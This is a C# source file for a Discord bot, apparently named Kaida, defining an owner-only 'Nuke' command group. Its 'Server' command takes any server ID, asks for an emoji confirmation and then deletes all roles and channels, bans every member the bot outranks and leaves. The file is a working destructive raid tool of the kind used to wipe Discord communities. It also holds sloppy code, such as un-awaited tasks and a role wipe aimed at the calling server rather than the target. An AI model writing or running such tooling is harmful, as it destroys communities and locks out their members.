using DSharpPlus.CommandsNext;
using DSharpPlus.CommandsNext.Attributes;
using DSharpPlus.CommandsNext.Converters;
using DSharpPlus.Entities;
using DSharpPlus.Interactivity;
using Kaida.Entities.Discord;
using Kaida.Library.Extensions;
using Serilog;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Kaida.Modules.Overpowered
{
    [Group("Nuke")]
    [RequireOwner]
    public class Nuke : BaseCommandModule
    {
        private readonly ILogger _logger;

        public Nuke(ILogger logger)
        {
            _logger = logger;
        }

        [Command("Server")]
        public async Task NukeServer(CommandContext context, ulong targetGuild, [RemainingText] string reason = null)
        {
            var interactivity = context.Client.GetInteractivity();

            var guild = await context.Client.GetGuildAsync(targetGuild);
            var green = DiscordEmoji.FromName(context.Client, ":green_circle:");
            var red = DiscordEmoji.FromName(context.Client, ":red_circle:");
            var emojis = new DiscordEmoji[] { green, red };
            var bot = await guild.GetMemberAsync(377449095872118784);
            var managableMembers = guild.Members.Values.Where(x => x.Hierarchy < bot.Hierarchy).ToList();

            var description = new StringBuilder()
                .AppendLine($"Dear {context.User.Username}, you are going to send out a tactical nuke to {guild.Name}.")
                .AppendLine("Are you sure you want to do this and erase the following listed items?").ToString();

            var rolesContent = new StringBuilder()
                .AppendLine(guild.Roles.Where(x => x.Value.Name != "@everyone").ToList().Count().ToString())
                .AppendLine("Those are the total roles, a few roles might not being deleted.").ToString();

            var fields = new List<EmbedField>()
            {
                new EmbedField
                {
                    Inline = false,
                    Name = "Roles",
                    Value = rolesContent
                },
                new EmbedField
                {
                    Inline = false,
                    Name = "Users",
                    Value = $"{guild.MemberCount} (Bannable: {managableMembers.Count()})"
                },
                new EmbedField
                {
                    Inline = true,
                    Name = "Categories Channels",
                    Value = guild.GetCategoryChannels().Result.Count.ToString()
                },
                new EmbedField
                {
                    Inline = true,
                    Name = "Text Channels",
                    Value = guild.GetTextChannels().Result.Count.ToString()
                },
                new EmbedField
                {
                    Inline = true,
                    Name = "Voice Channels",
                    Value = guild.GetVoiceChannels().Result.Count.ToString()
                },
                new EmbedField
                {
                    Inline = true,
                    Name = "News Channels",
                    Value = guild.GetNewsChannels().Result.Count.ToString()
                }
            };

            var embed = new DiscordEmbedBuilder()
            {
                Title = "Caution - this is not a drill!",
                Color = DiscordColor.IndianRed,
                Description = description
            };

            foreach (var field in fields)
            {
                embed.AddField(field.Name, field.Value, field.Inline);
            }

            var pollMessage = await context.RespondAsync(embed: embed);

            interactivity.DoPollAsync(pollMessage, emojis, timeout: TimeSpan.FromSeconds(20));
            var reaction = interactivity.WaitForReactionAsync(x => x.Emoji == emojis[0] || x.Emoji == emojis[1], context.User, TimeSpan.FromSeconds(15));

            if (reaction.Result.Result.User == context.User && reaction.Result.Result.Emoji == emojis[1])
            {
                await context.RespondAsync("Tactical nuke aborted!");
            }

            if (reaction.Result.Result.User == context.User && reaction.Result.Result.Emoji == emojis[0])
            {
                await context.RespondAsync("__**Tactical nuke incoming!**__");
                await context.RespondAsync("3");
                await context.RespondAsync("2");
                await context.RespondAsync("1");
                await NukeAllRoles(context);
                await guild.DeleteAllChannelsAsync();
                await guild.DoBanAllMembers();
                var respondEmbed = new DiscordEmbedBuilder()
                {
                    Title = guild.Name,
                    Description = $"{guild.Name} is nuked!\nUsers banned: {managableMembers.Count()}"
                };
                
                context.RespondAsync(embed: respondEmbed);
                await guild.LeaveAsync();
            }
        }

        [Command("Channels")]
        public async Task NukeChannels(CommandContext context, [RemainingText] string reason = null)
        {
            
        }

        [Command("Voices")]
        public async Task NukeVoices(CommandContext context, [RemainingText] string reason = null)
        {

        }

        [Command("Roles")]
        public async Task NukeRoles(CommandContext context, [RemainingText] string reason)
        {
            await NukeAllRoles(context);
        }

        private async Task NukeAllChannels(CommandContext context)
        {
            var channels = await context.Guild.GetTextChannels();

            foreach (var channel in channels)
            {
                await channel.DeleteAsync();
                Task.Delay(TimeSpan.FromSeconds(1));
            }
        }

        private async Task NukeAllVoices(CommandContext context)
        {
            var channels = await context.Guild.GetVoiceChannels();

            foreach (var channel in channels)
            {
                await channel.DeleteAsync();
                Task.Delay(TimeSpan.FromSeconds(1));
            }
        }

        private async Task NukeAllRoles(CommandContext context)
        {
            var roles = await context.Guild.GetRoles();

            foreach (var role in roles)
            {
                if (role.Name != "@everyone") role.DeleteAsync();
                Task.Delay(TimeSpan.FromSeconds(1));
            }
        }
    }
}
